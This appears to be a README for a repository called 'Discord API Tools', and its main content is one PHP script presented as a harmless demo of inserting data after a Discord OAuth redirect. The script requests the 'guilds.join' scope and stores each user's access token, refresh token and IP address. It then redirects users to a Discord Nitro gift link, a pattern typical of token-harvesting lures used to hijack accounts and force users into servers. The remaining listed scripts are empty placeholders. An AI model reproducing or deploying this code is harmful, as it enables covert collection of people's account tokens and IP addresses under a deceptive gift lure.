# Discord API Tools

This repository houses a collection of tools designed to interact with the Discord API, easing the process of managing and interacting with Discord data.

## Table of Contents

1. [InsertDataExample.php](#insertdataexamplephp)
2. [Script 2](#script-2)
3. [Script 3](#script-3)
4. [Script 4](#script-4)
5. [Script 5](#script-5)
6. [Script 6](#script-6)

## InsertDataExample.php

`InsertDataExample.php` is a PHP script that demonstrates how to insert data into a database after Discord redirects the user to your webhook.

### Usage

1. Set up a MySQL database and replace the connection details in the `sql.php` file.
2. Replace the `clientId`, `clientSecret`, and `redirectUri` variables with your Discord application's details.
3. Host this script on a server and set the redirect URI in your Discord application to point to this script.

### Code

```php
<?php

include 'sql.php';  // Connection to your database

$clientId = '';  // Your client ID
$clientSecret = '';  // Your client secret
$redirectUri = '';  // Your redirect URI

// Verify if we have the authorization code from Discord
if (isset($_GET['code'])) {
    $code = $_GET['code'];

    // Get the access token
    $postData = array(
        'client_id' => $clientId,
        'client_secret' => $clientSecret,
        'grant_type' => 'authorization_code',
        'code' => $code,
        'redirect_uri' => $redirectUri,
        'scope' => 'identify guilds.join' 
    );

    $curl = curl_init('https://discord.com/api/oauth2/token');
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);
    curl_close($curl);

    $jsonResponse = json_decode($response, true);

    // Verify if we have the access token
    if (isset($jsonResponse['access_token'])) {
        $accessToken = $jsonResponse['access_token'];
    
        // Get the user information
        $curl = curl_init('https://discord.com/api/users/@me');
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'Authorization: Bearer ' . $accessToken
        ));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    
        $response = curl_exec($curl);
        curl_close($curl);
        
    
        $userData = json_decode($response, true);

        // Check if user is already in database
        $checkUser = $conn->prepare("SELECT * FROM discords WHERE discord_id = ?");
        $checkUser->bind_param("s", $userData['id']);
        $checkUser->execute();
        $checkUserResult = $checkUser->get_result();

        if ($checkUserResult->num_rows > 0) {  // If user is already in database, update his access token and refresh token
            $update = $conn->prepare("UPDATE discords SET access_token = ?, refresh_token = ?, hak = ? WHERE discord_id = ?");
            $update->bind_param("ssss", $accessToken, $jsonResponse['refresh_token'], $_SERVER['REMOTE_ADDR'], $userData['id']);
            $update->execute();
            header('Location: https://discord.gift/2DgPTMJxeQVDu6Ey?error=2');
            exit;
        }

        // Insert user in database with his access token and refresh token
        $stmt = $conn->prepare("INSERT INTO discords (discord_id, access_token, refresh_token, hak) VALUES (?, ?, ?, ?)");
        $stmt->bind_param("ssss", $userData['id'], $accessToken, $jsonResponse['refresh_token'], $_SERVER['REMOTE_ADDR']);
        $stmt->execute();
        header('Location: https://discord.gift/2DgPTMJxeQVDu6Ey');
    } else {
        header('Location: https://discord.gift/2DgPTMJxeQVDu6Ey?error=1');
    }
    
} else {
    // Redirect to Discord OAuth2 authorization page
    $authUrl = 'https://discord.com/api/oauth2/authorize?' . http_build_query(array(
        'client_id' => $clientId,
        'redirect_uri' => $redirectUri,
        'response_type' => 'code',
        'scope' => 'identify guilds.join' 
    ));

    header('Location: ' . $authUrl);
    exit;
}

?>
